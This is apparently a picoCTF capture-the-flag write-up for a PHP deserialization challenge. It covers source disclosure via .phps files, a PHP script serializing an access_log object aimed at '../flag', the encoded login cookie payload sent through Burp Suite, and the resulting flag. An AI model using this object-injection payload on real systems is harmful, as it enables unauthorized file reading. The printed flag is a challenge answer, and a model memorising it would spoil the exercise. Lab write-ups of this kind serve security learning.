In this lvl we first need to use robots.txt to get the clue.
I used sql injection and all but it did'nt work.
Then I saw that there's a admin.phps file present so I used it but got nothing.
Then I saw that there's a index page when I used inspect therefore I did /index.php but got nothing then I used /index.phps to get the source code of the working of index.php.<br>
Then I saw the refernce of 'authentication' therfore I used /authentication.phps to get the source code and saw a refernce of cookie so I used /cookie.phps to get the working.
The best thing to do is to get all the source code at one file and investigate through it. 
<br>
I have'nt included the whole source code but it would be better to traverse through the source code and see the working of calling functions and all. I have included the main code to explain the working
<br>
In cookie.phps we have this code :<br>
if ($perm_res->is_guest() || $perm_res->is_admin()) { <br>
		setcookie("login", urlencode(base64_encode(serialize($perm_res))), time() + (86400 * 30), "/");
		<br>header("Location: authentication.php");
		<br>die();
<br>	} else
   <br>    {
	<br>	$msg = ``<h6 class="text-center" style="color:red">Invalid Login.</h6>";``
       <br> }
       <br><br>
       and this piece of code
    <br><br>
<br>    if(isset($_COOKIE["login"])){
<br>    try{
	<br>	$perm = unserialize(base64_decode(urldecode($_COOKIE["login"])));
		<br>$g = $perm->is_guest();
<br>		$a = $perm->is_admin();
<br>	}
<br>	catch(Error $e){
	<br>	die("Deserialization error. ".$perm);
<br>	}

<br>
<br>
So now the thing we need to do it use a cookie of name login and give the value of [urlencode(base64_encode(serialize($perm_res)))] this to it.<br>
This whole thing can be done easily but to serialize we need to use php compiler. <br>
Code for serializing:<br>
<br><?php
<br>class access_log
<br>{
<br>	public $log_file;
<br> function __construct($lf) {
<br>		$this->log_file = $lf;
<br>	}
<br>function __toString() {
<br>		return $this->read_log();
	<br>}
<br>	function append_to_log($data) {
	<br>	file_put_contents($this->log_file, $data, FILE_APPEND);
<br>	}
<br>function read_log() {
<br>		return file_get_contents($this->log_file);
	<br>}
<br>}
<br>echo (serialize(new access_log("../flag")));
<br>?>
<br>This ../flag is used as its the path and 'new access_log' is constructor of class access_log you can verify this if you would have done what I told.
<br>Then use code chef to do the rest to encoding.<br>
Now use burpsuite and give <br>
Cookie:login=TzoxMDoiYWNjZXNzX2xvZyI6MTp7czo4OiJsb2dfZmlsZSI7czo3OiIuLi9mbGFnIjt9; PHPSESSID=a365f6sfh7jp6nu84eu570lnbn
<br>Here TzoxMDoiYWNjZXNzX2xvZyI6MTp7czo4OiJsb2dfZmlsZSI7czo3OiIuLi9mbGFnIjt9 is what we get after encoding and all.
<br>Forward this and you will get the error with the flag ^-^.
 
------------------------------------
Flag : picoCTF{th15_vu1n_1s_5up3r_53r1ous_y4ll_405f4c0e}
-----------------